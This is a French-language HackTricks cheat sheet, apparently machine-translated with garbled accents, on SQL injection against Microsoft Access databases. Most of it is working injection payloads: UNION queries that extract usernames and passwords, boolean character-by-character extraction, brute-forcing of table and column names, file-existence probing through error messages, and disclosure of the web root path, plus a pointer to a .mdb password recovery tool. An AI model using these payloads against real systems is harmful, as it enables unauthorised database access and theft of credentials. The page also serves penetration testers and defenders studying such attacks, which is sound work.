# Injection SQL MS Access

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe t√©l√©gramme**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Terrain de jeu en ligne

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Limitations de la BD

### Concat√©nation de cha√Ænes

La concat√©nation de cha√Ænes est possible avec les caract√®res `& (%26)` et `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Commentaires

Il n'y a pas de commentaires dans MS Access, mais apparemment, il est possible de supprimer la fin d'une requ√™te avec un caract√®re NULL :
```sql
1' union select 1,2 from table%00
```
Si cela ne fonctionne pas, vous pourriez toujours corriger la syntaxe de la requ√™te :
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Requ√™tes Empil√©es

Elles ne sont pas prises en charge.

### LIMIT

L'op√©rateur **`LIMIT`** **n'est pas impl√©ment√©**. Cependant, il est possible de limiter les r√©sultats d'une requ√™te SELECT aux **premi√®res N lignes d'une table en utilisant l'op√©rateur `TOP`**. `TOP` accepte comme argument un entier, repr√©sentant le nombre de lignes √† retourner.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Tout comme **`TOP`**, vous pouvez utiliser **`LAST`** qui r√©cup√©rera **les lignes √† partir de la fin**.

## Requ√™tes UNION/Sous-requ√™tes

Dans une SQLi, vous voudrez g√©n√©ralement ex√©cuter une nouvelle requ√™te pour extraire des informations d'autres tables. MS Access exige toujours que dans **les sous-requ√™tes ou requ√™tes suppl√©mentaires, un `FROM` soit indiqu√©**.\
Ainsi, si vous souhaitez ex√©cuter un `UNION SELECT` ou `UNION ALL SELECT` ou un `SELECT` entre parenth√®ses dans une condition, vous devez toujours **indiquer un `FROM` avec un nom de table valide**.\
Par cons√©quent, vous devez conna√Ætre un **nom de table valide**.
```sql
-1' UNION SELECT username,password from users%00
```
### Cha√Ænage d'√©galit√©s + Sous-cha√Æne

{% hint style="warning" %}
Cela vous permettra d'exfiltrer les valeurs de la table courante sans avoir besoin de conna√Ætre le nom de la table.
{% endhint %}

**MS Access** permet une **syntaxe √©trange** telle que **`'1'=2='3'='asd'=false`**. Comme d'habitude, l'injection SQL sera √† l'int√©rieur d'une clause **`WHERE`**, nous pouvons en abuser.

Imaginez que vous ayez une SQLi dans une base de donn√©es MS Access et que vous savez (ou supposez) qu'un **nom de colonne est username**, et c'est le champ que vous souhaitez **exfiltrer**. Vous pourriez v√©rifier les diff√©rentes r√©ponses de l'application web lorsque la technique de cha√Ænage d'√©galit√©s est utilis√©e et potentiellement exfiltrer le contenu avec une **injection bool√©enne** en utilisant la fonction **`Mid`** pour obtenir des sous-cha√Ænes.
```sql
'=(Mid(username,1,3)='adm')='
```
Si vous connaissez le **nom de la table** et de la **colonne** √† extraire, vous pouvez utiliser une combinaison de `Mid`, `LAST` et `TOP` pour **fuir toutes les infos** via SQLi bool√©en :
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Sentez-vous libre de v√©rifier cela dans l'aire de jeu en ligne._

### For√ßage brutal des noms de tables

En utilisant la technique de cha√Ænage des √©galit√©s, vous pouvez √©galement **forcer brutalement les noms de tables** avec quelque chose comme :
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Vous pouvez √©galement utiliser une m√©thode plus traditionnelle :
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_N'h√©sitez pas √† v√©rifier cela dans le terrain de jeu en ligne._

* Noms de tables courants Sqlmap : [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Il existe une autre liste sur [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### For√ßage Brut des Noms de Colonnes

Vous pouvez **forcer brutalement les noms de colonnes actuels** avec l'astuce de cha√Ænage des √©galit√©s avec :
```sql
'=column_name='
```
Ou avec un **group by** :
```sql
-1' GROUP BY column_name%00
```
Ou vous pouvez forcer brutalement les noms de colonnes d'une **table diff√©rente** avec :
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Extraction de donn√©es

Nous avons d√©j√† discut√© de la [**technique de cha√Ænage des √©galit√©s**](ms-access-sql-injection.md#chaining-equals-+-substring) **pour extraire des donn√©es de la table courante et d'autres tables**. Mais il existe d'autres m√©thodes :
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
En r√©sum√©, la requ√™te utilise une instruction "if-then" pour d√©clencher un "200 OK" en cas de succ√®s ou une "500 Internal Error" sinon. En tirant parti de l'op√©rateur TOP 10, il est possible de s√©lectionner les dix premiers r√©sultats. L'utilisation subs√©quente de LAST permet de ne consid√©rer que la 10√®me tuple. Sur une telle valeur, en utilisant l'op√©rateur MID, il est possible d'effectuer une simple comparaison de caract√®res. En changeant correctement l'indice de MID et TOP, nous pouvons extraire le contenu du champ "username" pour toutes les lignes.

### Bas√© sur le temps

Consultez [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Autres fonctions int√©ressantes

* `Mid('admin',1,1)` obtient la sous-cha√Æne √† partir de la position 1 de longueur 1 (la position initiale est 1)
* `LEN('1234')` obtient la longueur de la cha√Æne
* `ASC('A')` obtient la valeur ascii du caract√®re
* `CHR(65)` obtient la cha√Æne √† partir de la valeur ascii
* `IIF(1=1,'a','b')` si alors
* `COUNT(*)` Compte le nombre d'√©l√©ments

## √ânum√©ration des tables

Depuis [**ici**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) vous pouvez voir une requ√™te pour obtenir les noms des tables :
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
```markdown
Cependant, notez qu'il est tr√®s typique de trouver des SQL Injections o√π vous **n'avez pas acc√®s pour lire la table `MSysObjects`**.

## Acc√®s au syst√®me de fichiers

### Chemin complet du r√©pertoire racine Web

La connaissance du **chemin absolu de la racine web peut faciliter d'autres attaques**. Si les erreurs de l'application ne sont pas compl√®tement dissimul√©es, le chemin du r√©pertoire peut √™tre d√©couvert en essayant de s√©lectionner des donn√©es √† partir d'une base de donn√©es inexistante.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access r√©pond avec un **message d'erreur contenant le chemin complet du r√©pertoire web**.

### √ânum√©ration de fichiers

Le vecteur d'attaque suivant peut √™tre utilis√© pour **inf√©rer l'existence d'un fichier sur le syst√®me de fichiers distant**. Si le fichier sp√©cifi√© existe, MS Access d√©clenche un message d'erreur informant que le format de la base de donn√©es est invalide :

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Une autre mani√®re d'√©num√©rer les fichiers consiste √† **sp√©cifier un √©l√©ment database.table**. **Si** le **fichier sp√©cifi√© existe**, MS Access affiche un **message d'erreur de format de base de donn√©es**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Deviner le nom de fichier .mdb

**Le nom de fichier de la base de donn√©es (.mdb)** peut √™tre d√©duit avec la requ√™te suivante :

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

O√π **name\[i] est un nom de fichier .mdb** et **realTable est une table existante** dans la base de donn√©es. Bien que MS Access d√©clenchera toujours un message d'erreur, il est possible de distinguer entre un nom de fichier invalide et un nom de fichier .mdb valide.

### .mdb Password Cracker

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) est un utilitaire gratuit qui peut √™tre utilis√© pour r√©cup√©rer le mot de passe principal de la base de donn√©es Microsoft Access 95/97/2000/XP ou Jet Database Engine 3.0/4.0.

## R√©f√©rences

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
